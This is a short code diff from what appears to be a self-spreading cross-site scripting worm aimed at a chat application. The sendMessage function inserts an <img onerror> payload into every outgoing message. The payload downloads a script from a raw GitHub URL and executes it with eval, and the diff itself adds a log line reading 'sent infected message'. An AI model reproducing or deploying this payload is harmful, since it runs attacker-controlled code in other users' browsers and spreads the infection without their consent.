@@ -5,6 +5,7 @@ if (typeof eafeaf === 'undefined') {
 eafeaf = true;
 
 function sendMessage() {
+            console.log("sent infected message");
             const name = getUsername();
             const content = `<img src="" onerror="if (typeof efef === 'undefined') {efef = true; var x = new XMLHttpRequest(); x.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { eval(x.responseText); } }; x.open('GET', 'https://raw.githubusercontent.com/davidtheplatform/megi-xss/main/main.js', true); x.send(); }">` + messageInput.value;
             const color = getUserColor();
